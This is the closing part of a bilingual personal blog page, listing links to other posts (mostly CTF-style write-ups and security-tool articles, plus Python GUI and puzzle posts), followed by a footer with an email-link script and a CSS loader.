      <section id="posts-section">
        <header lang="en"><h3>See also...</h3></header>
        <header lang="el"><h3>Δείτε επίσης...</h3></header>
        <div>
          
          
          
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Legacy write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">19 Oct 2017</time>
      <time lang="el">19 Οκτ 2017</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Falafel write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">23 Jun 2018</time>
      <time lang="el">23 Ιουν 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/rold/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/rold.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Retriever of Lost Dreams</h3>
      <h3 class="title" lang="el">Ο Ιχνηλάτης των Χαμένων Ονείρων</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">16 Aug 2015</time>
      <time lang="el">16 Αυγ 2015</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Node write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Node</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">03 Mar 2018</time>
      <time lang="el">03 Μαρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/unattended_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/unattended.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Unattended write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Unattended</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">23 Aug 2019</time>
      <time lang="el">23 Αυγ 2019</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Minion write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">10 Apr 2018</time>
      <time lang="el">10 Απρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Querier write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Querier</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">22 Jun 2019</time>
      <time lang="el">22 Ιουν 2019</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Nineveh write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">17 Dec 2017</time>
      <time lang="el">17 Δεκ 2017</time>
    </footer>
  </a>
</article>

           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Optimum write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">28 Oct 2017</time>
      <time lang="el">28 Οκτ 2017</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Enterprise write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">19 Mar 2018</time>
      <time lang="el">19 Μαρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Fortune write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">02 Aug 2019</time>
      <time lang="el">02 Αυγ 2019</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Reddish write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">26 Jan 2019</time>
      <time lang="el">26 Ιαν 2019</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/shutdown_manager_plain/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/shutdown_button.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Creation of a shutdown GUI using Gtk in Python</h3>
      <h3 class="title" lang="el">Δημιουργία μιας γραφικής διεπαφής κλεισίματος με τη χρήση Gtk σε Python</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">21 Jul 2016</time>
      <time lang="el">21 Ιουλ 2016</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Mantis write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">18 Feb 2018</time>
      <time lang="el">18 Φεβ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/nl80211/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/wifi-sign.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">How to get info for the wireless interface using nl80211 in C</h3>
      <h3 class="title" lang="el">Πως να λάβετε πληροφορίες για την ασύρματη διεπαφή χρησιμοποιώντας την nl80211 στη C</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">09 Oct 2016</time>
      <time lang="el">09 Οκτ 2016</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">13 May 2018</time>
      <time lang="el">13 Μαϊ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Sense write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">24 Mar 2018</time>
      <time lang="el">24 Μαρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/fast_commit_push/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/binary_flow.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Git &amp; Mercurial: How to commit-push fast and easily</h3>
      <h3 class="title" lang="el">Git &amp; Mercurial: Πως να κάνετε commit-push γρήγορα και εύκολα</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">17 Oct 2016</time>
      <time lang="el">17 Οκτ 2016</time>
    </footer>
  </a>
</article>

           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Tally write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">03 May 2018</time>
      <time lang="el">03 Μαϊ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">27 Jul 2019</time>
      <time lang="el">27 Ιουλ 2019</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/shutdown_manager_transparent/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/transparent_shutdown.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Creation of a transparent shutdown GUI using Gtk and Cairo in Python</h3>
      <h3 class="title" lang="el">Δημιουργία μιας διαφανούς γραφικής διεπαφής κλεισίματος με τη χρήση Gtk και Cairo σε Python</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">19 Sep 2016</time>
      <time lang="el">19 Σεπ 2016</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/inception_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Inception write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Inception</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">14 Apr 2018</time>
      <time lang="el">14 Απρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/matchsticks/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/matchsticks.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Alamot&#39;s matchstick puzzles</h3>
      <h3 class="title" lang="el">Σπιρτοσπαζοκεφαλιές</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">11 Mar 2014</time>
      <time lang="el">11 Μαρ 2014</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">MSSQL shell with file upload capability</h3>
      <h3 class="title" lang="el">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">13 Apr 2018</time>
      <time lang="el">13 Απρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/path.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Path-traversal archiver</h3>
      <h3 class="title" lang="el">Αρχειοθέτης με διάσχιση διαδρομής</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">14 May 2019</time>
      <time lang="el">14 Μαϊ 2019</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/get_outlook_rules/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/flying_mail.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">How to collect Outlook rules using Powershell</h3>
      <h3 class="title" lang="el">Πως να συλλέξετε τους κανόνες του Outlook χρησιμοποιώντας Powershell</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">20 May 2022</time>
      <time lang="el">20 Μαϊ 2022</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/xor_kpa/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/keylock.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Known-plaintext attack tool for XOR-encrypted data</h3>
      <h3 class="title" lang="el">Εργαλείο επιθέσεων γνωστού αρχικού κειμένου έναντι XOR-κρυπτογραφημένων δεδομένων</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">22 Apr 2018</time>
      <time lang="el">22 Απρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Reverse shells</h3>
      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">12 Apr 2018</time>
      <time lang="el">12 Απρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/oracle/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Ask and you shall receive</h3>
      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">04 May 2019</time>
      <time lang="el">04 Μαϊ 2019</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">09 Apr 2018</time>
      <time lang="el">09 Απρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
        </div>
      </section>
      
    </div>
   </div> 
  </div>


<footer class="l-footer">
<span class="copyleft">&copy;</span>
<span lang="en">&nbsp; Antonios Tsolis &nbsp; </span>
<span lang="el">&nbsp; Αντώνιος Τσώλης &nbsp; </span>
<script>
  function email(starting,server,firstname,lastname,subject,body,closing) {
    document.write(starting); document.write(lastname); document.write("." + firstname); document.write("@" + server);if (Boolean(subject)) { document.write("?subject=" + subject + "&body=" + body); }
    document.write(closing); }
  email("<a class='mymail' href='mailto:", "gmail.com", "antonios", "tsolis", "", "","' target='_blank'><i class='fa fa-envelope-o' aria-hidden='true'></i></a>");
</script>
</footer>
<script async src="https://alamot.github.io/js/jq-btsp-lunr.min.js" onload="init()"></script>
<script>
short_months = {
  "en": ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"],
  "el": ["Ιαν", "Φεβ", "Μαρ", "Απρ", "Μαϊ", "Ιουν", "Ιουλ", "Αυγ", "Σεπ", "Οκτ", "Νοε", "Δεκ"]
}
function init () {
$(document).ready(function(){
  $("#lang-selector>ul>li>a").click(function(){
    var langid = this.id;
    var selText = this.text;
    document.getElementById('mainbody').setAttribute('class', langid);
    document.getElementById('mainbody').setAttribute('lang', langid);
    localStorage.setItem('language', langid);
    $("#lang-selector>a").html(selText+' <i class="fa fa-caret-down" aria-hidden="true"></i>');
  });

  $("#TableOfContents a, #content-selector a").on('click', function(e) {
    var hash = this.hash;
    if (hash) {
      e.preventDefault();
      $('html, body').animate({scrollTop: $(hash).offset().top}, 1300, function(){
        window.location.hash = hash;
      });
    }  
  });

  
});}
</script>
<script>
(function(a){var b=function(b,h,n){function d(a){if(f.body)return a();setTimeout(function(){d(a)})}function k(){c.addEventListener&&c.removeEventListener("load",k);c.media=n||"all"}var f=a.document,c=f.createElement("link"),g;if(h)g=h;else{var e=(f.body||f.getElementsByTagName("head")[0]).childNodes;g=e[e.length-1]}var m=f.styleSheets;c.rel="stylesheet";c.href=b;c.media="only x";d(function(){g.parentNode.insertBefore(c,h?g:g.nextSibling)});var l=function(a){for(var b=c.href,d=m.length;d--;)if(m[d].href===
b)return a();setTimeout(function(){l(a)})};c.addEventListener&&c.addEventListener("load",k);c.onloadcssdefined=l;l(k);return c};"undefined"!==typeof exports?exports.loadCSS=b:a.loadCSS=b})("undefined"!==typeof global?global:this);
(function(a){if(a.loadCSS){var b=loadCSS.relpreload={};b.support=function(){try{return a.document.createElement("link").relList.supports("preload")}catch(h){return!1}};b.poly=function(){for(var b=a.document.getElementsByTagName("link"),e=0;e<b.length;e++){var d=b[e];"preload"===d.rel&&"style"===d.getAttribute("as")&&(a.loadCSS(d.href,d),d.rel=null)}};if(!b.support()){b.poly();var e=a.setInterval(b.poly,300);a.addEventListener&&a.addEventListener("load",function(){a.clearInterval(e)});a.attachEvent&&
a.attachEvent("onload",function(){a.clearInterval(e)})}}})(this);
</script>
</body>
</html>

